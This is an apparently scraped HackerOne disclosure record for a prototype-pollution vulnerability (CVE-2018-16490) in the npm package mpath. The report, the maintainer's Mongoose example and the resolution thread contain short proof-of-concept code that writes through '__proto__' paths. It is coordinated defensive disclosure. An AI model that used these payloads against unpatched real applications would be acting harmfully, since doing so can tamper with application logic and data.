{"id":390860,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTA4NjA=","url":"https://hackerone.com/reports/390860","title":"Prototype Pollution Vulnerability in mpath Package","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-08-06T10:40:21.199Z","submitted_at":"2018-08-06T10:40:21.199Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cris_semmle","url":"/cris_semmle","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/320/894/63a7168e6cfdfe973d7e4efc96fbc6088b092fd2_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-16490"],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-30T06:21:32.425Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-10-31T06:21:24.149Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report prototype pollution vulnerability in mpath.\nIt allows an attacker to inject arbitrary properties on Object.prototype.\n\n# Module\n\n**module name:** mpath\n**version:** 0.4.1\n**npm page:** `https://www.npmjs.com/package/mpath`\n\n## Module Description\n\n{G,S}et javascript object values using MongoDB-like path notatio\n\n## Module Stats\n\n305,874 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nAn attacker can specify a path that include the prototype object, and thus overwrite important properties on Object.prototype or add new ones.\n\n## Steps To Reproduce:\n\n```js\nvar mpath = require(\"mpath\");\nvar obj = {\n    comments: [\n        { title: 'funny' },\n        { title: 'exciting!' }\n    ]\n}\nmpath.set('__proto__.x', ['hilarious', 'fruity'], obj);\nconsole.log({}.x); \n```\n\n## Patch\n\nN/A validate property names before overwriting them and prevent write to certain paths.\n\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N\n- I opened an issue in the related repository: N\n\n## Impact\n\nThis may be an intended behaviour of this module, but it needs to be better documented. Moreover, to properly analyse the impact of this vulnerability one must look at the clients of this module, such as mongoose and see if attackers can realistically control the path value.","vulnerability_information_html":"\u003cp\u003eI would like to report prototype pollution vulnerability in mpath.\u003cbr\u003e\nIt allows an attacker to inject arbitrary properties on Object.prototype.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e mpath\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.4.1\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/mpath\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003e{G,S}et javascript object values using MongoDB-like path notatio\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e305,874 downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can specify a path that include the prototype object, and thus overwrite important properties on Object.prototype or add new ones.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003empath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003empath\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eobj\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003ecomments\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efunny\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eexciting!\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nx\"\u003empath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e__proto__.x\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehilarious\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efruity\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nx\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e({}.\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eN/A validate property names before overwriting them and prevent write to certain paths.\u003c/p\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis may be an intended behaviour of this module, but it needs to be better documented. Moreover, to properly analyse the impact of this vulnerability one must look at the clients of this module, such as mongoose and see if attackers can realistically control the path value.\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-11-30T06:21:24.223Z","allow_singular_disclosure_after":-65662083.844758295,"singular_disclosure_allowed":true,"vote_count":5,"voters":["sameerphad72","mygf","tulswani","khizer47","reppie"],"severity":{"rating":"high","score":7.6,"author_type":"User","metrics":{"attack_vector":"adjacent","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"high","availability":"low"}},"structured_scope":{"databaseId":18763,"asset_type":"SOURCE_CODE","asset_identifier":"mpath","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3150389,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-06T10:40:32.675Z","updated_at":"2018-08-06T10:40:32.675Z","additional_data":{"old_title":"Prototype Pollution Vulnerability in mpatch Package","new_title":"Prototype Pollution Vulnerability in mpath Package"},"actor":{"username":"cris_semmle","cleared":false,"url":"/cris_semmle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/320/894/63a7168e6cfdfe973d7e4efc96fbc6088b092fd2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3150469,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @cris_semmle,\n\nThank you for the report. We are currently reviewing this and will get in touch with you once our review is complete. \n\nRegards,\n@dukefleed","markdown_message":"\u003cp\u003eHello \u003ca href=\"/cris_semmle\"\u003e@cris_semmle\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for the report. We are currently reviewing this and will get in touch with you once our review is complete. \u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/dukefleed\"\u003e@dukefleed\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-06T11:11:54.017Z","updated_at":"2018-08-06T11:11:54.017Z","actor":{"username":"dukefleed","cleared":false,"url":"/dukefleed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/179/358/4957a9bf08fe3fed492a5def8b2afd61e032c96f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3263195,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi \u003cHACKER\u003e,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi \u0026lt;HACKER\u0026gt;,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-29T10:21:59.702Z","updated_at":"2018-08-29T10:21:59.702Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3264229,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-29T14:29:06.303Z","updated_at":"2018-08-29T14:29:06.303Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3264288,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Confirmed, I'll fix this later today and release a fix tomorrow. mpath should throw an error if proto is in the path. This issue _only_ affects Mongoose if strict mode is explicitly set to false:\n\n```javascript\nconst mongoose = require('mongoose');\n\nconst schema = new mongoose.Schema({\n  name: String\n}, { strict: false }); // Only works if this is `false`. If `true` or `'throw'`, mongoose will strip out __proto__\n\nconst Model = mongoose.model('Test', schema);\n\nconst doc = new Model({ '__proto__.x': 'foo' });\n\nconsole.log(Model);\nconsole.log(Model.x); // 'foo' as long as `strict: false` is set on the schema\n```\n","markdown_message":"\u003cp\u003eConfirmed, I\u0026#39;ll fix this later today and release a fix tomorrow. mpath should throw an error if proto is in the path. This issue \u003cu\u003eonly\u003c/u\u003e affects Mongoose if strict mode is explicitly set to false:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003emongoose\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emongoose\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003emongoose\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eString\u003c/span\u003e\n\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003estrict\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e \u003cspan class=\"c1\"\u003e// Only works if this is `false`. If `true` or `\u0026#39;throw\u0026#39;`, mongoose will strip out __proto__\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eModel\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003emongoose\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emodel\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eTest\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003edoc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eModel\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e__proto__.x\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efoo\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eModel\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eModel\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026#39;foo\u0026#39; as long as `strict: false` is set on the schema\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-08-29T14:42:15.756Z","updated_at":"2018-08-29T14:42:15.756Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3267248,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vkarpov15 , thanks for your quick response. Please let me know when you have the fix published.","markdown_message":"\u003cp\u003e\u003ca href=\"/vkarpov15\"\u003e@vkarpov15\u003c/a\u003e , thanks for your quick response. Please let me know when you have the fix published.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-30T07:44:42.918Z","updated_at":"2018-08-30T07:44:42.918Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3270268,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@e_lexy I just published mpath 0.5.0 and Mongoose 5.2.11 + 4.13.16 with the fix. Do you have any recommendations on how to best communicate this?","markdown_message":"\u003cp\u003e\u003ca href=\"/e_lexy\"\u003e@e_lexy\u003c/a\u003e I just published mpath 0.5.0 and Mongoose 5.2.11 + 4.13.16 with the fix. Do you have any recommendations on how to best communicate this?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-30T15:38:30.474Z","updated_at":"2018-08-30T15:38:30.474Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3270668,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We also found a similar issue with using 'constructor' instead of '__proto__' that one of our community members pointed out. Released mpath 0.5.1, Mongoose 5.2.12, and Mongoose 4.13.17 with the fix.","markdown_message":"\u003cp\u003eWe also found a similar issue with using \u0026#39;constructor\u0026#39; instead of \u0026#39;\u003cstrong\u003eproto\u003c/strong\u003e\u0026#39; that one of our community members pointed out. Released mpath 0.5.1, Mongoose 5.2.12, and Mongoose 4.13.17 with the fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-30T17:05:03.007Z","updated_at":"2018-08-30T17:05:03.007Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3554970,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@vkarpov15 When you have a fixed version published I would at least mention it in the changelog.\nWhether you want to mention this is the readme is up to you.\nAs soon as this report id public, scanners like `npm audit` and `snyk` will flag the vulnerability.\nif users choose to ignore, it's up to them.","markdown_message":"\u003cp\u003e\u003ca href=\"/vkarpov15\"\u003e@vkarpov15\u003c/a\u003e When you have a fixed version published I would at least mention it in the changelog.\u003cbr\u003e\nWhether you want to mention this is the readme is up to you.\u003cbr\u003e\nAs soon as this report id public, scanners like \u003ccode\u003enpm audit\u003c/code\u003e and \u003ccode\u003esnyk\u003c/code\u003e will flag the vulnerability.\u003cbr\u003e\nif users choose to ignore, it\u0026#39;s up to them.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-30T12:48:21.166Z","updated_at":"2018-10-30T12:48:21.166Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3554978,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@cris_semmle can you confirm the new release fixes this? For me it works -\u003e the result is now `undefined`!","markdown_message":"\u003cp\u003e\u003ca href=\"/cris_semmle\"\u003e@cris_semmle\u003c/a\u003e can you confirm the new release fixes this? For me it works -\u0026gt; the result is now \u003ccode\u003eundefined\u003c/code\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-30T12:50:30.072Z","updated_at":"2018-10-30T12:50:30.072Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3558329,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@e_lexy I added a note to the changelog here: https://github.com/aheckmann/mpath/blob/master/History.md#051--2018-08-30 I didn't want to mention that this was explicitly a security fix because I wasn't sure about whether that was disclosure or not. How do you recommend we proceed? I was just planning on posting a new page on mongoosejs.com with security disclosures, including this one, in November after people had some time to upgrade.","markdown_message":"\u003cp\u003e\u003ca href=\"/e_lexy\"\u003e@e_lexy\u003c/a\u003e I added a note to the changelog here: \u003ca title=\"https://github.com/aheckmann/mpath/blob/master/History.md#051--2018-08-30\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Faheckmann%2Fmpath%2Fblob%2Fmaster%2FHistory.md%23051--2018-08-30\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/aheckmann/mpath/blob/master/History.md#051--2018-08-30\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e I didn\u0026#39;t want to mention that this was explicitly a security fix because I wasn\u0026#39;t sure about whether that was disclosure or not. How do you recommend we proceed? I was just planning on posting a new page on mongoosejs.com with security disclosures, including this one, in November after people had some time to upgrade.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-30T22:21:45.006Z","updated_at":"2018-10-30T22:21:45.006Z","actor":{"username":"vkarpov15","cleared":false,"url":"/vkarpov15","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3560102,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I can confirm that this appears to be fixed.","markdown_message":"\u003cp\u003eYes, I can confirm that this appears to be fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-31T01:40:37.929Z","updated_at":"2018-10-31T01:40:37.929Z","actor":{"username":"cris_semmle","cleared":false,"url":"/cris_semmle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/320/894/63a7168e6cfdfe973d7e4efc96fbc6088b092fd2_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3560761,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@cris_semmle and @vkarpov15 first of all thanks for your swift responses in squsahing this one!\n@vkarpov15 your plan to expose this and possibly other security fixes on the mongoose page sounds good to me. We don't really have a protocol we can hand to maintainers. I will create an issue with our team to talk about that and see if we want to prepare one to hand out in case a maintainer asks for guidance.\n\nMoving to close this one then. requesting a CVE as well.","markdown_message":"\u003cp\u003e\u003ca href=\"/cris_semmle\"\u003e@cris_semmle\u003c/a\u003e and \u003ca href=\"/vkarpov15\"\u003e@vkarpov15\u003c/a\u003e first of all thanks for your swift responses in squsahing this one!\u003cbr\u003e\n\u003ca href=\"/vkarpov15\"\u003e@vkarpov15\u003c/a\u003e your plan to expose this and possibly other security fixes on the mongoose page sounds good to me. We don\u0026#39;t really have a protocol we can hand to maintainers. I will create an issue with our team to talk about that and see if we want to prepare one to hand out in case a maintainer asks for guidance.\u003c/p\u003e\n\n\u003cp\u003eMoving to close this one then. requesting a CVE as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-31T06:18:37.831Z","updated_at":"2018-10-31T06:18:37.831Z","actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"cris_semmle","url":"/cris_semmle"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3560771,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"the new version 0.5.1 fixes this issue. ","markdown_message":"\u003cp\u003ethe new version 0.5.1 fixes this issue. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-31T06:21:24.165Z","updated_at":"2018-10-31T06:21:24.165Z","first_to_agree":true,"actor":{"username":"e_lexy","cleared":false,"url":"/e_lexy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3737024,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-30T06:21:32.449Z","updated_at":"2018-11-30T06:21:32.449Z","actor":{"url":"/nodejs-ecosystem","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Node.js third-party modules"}},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3754898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Published this on my blog: http://thecodebarbarian.com/mongoose-prototype-pollution-vulnerability-disclosure.html","markdown_message":"\u003cp\u003ePublished this on my blog: \u003ca title=\"http://thecodebarbarian.com/mongoose-prototype-pollution-vulnerability-disclosure.html\" href=\"/redirect?url=http%3A%2F%2Fthecodebarbarian.com%2Fmongoose-prototype-pollution-vulnerability-disclosure.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://thecodebarbarian.com/mongoose-prototype-pollution-vulnerability-disclosure.html\u003c/span\u003e\u003ci 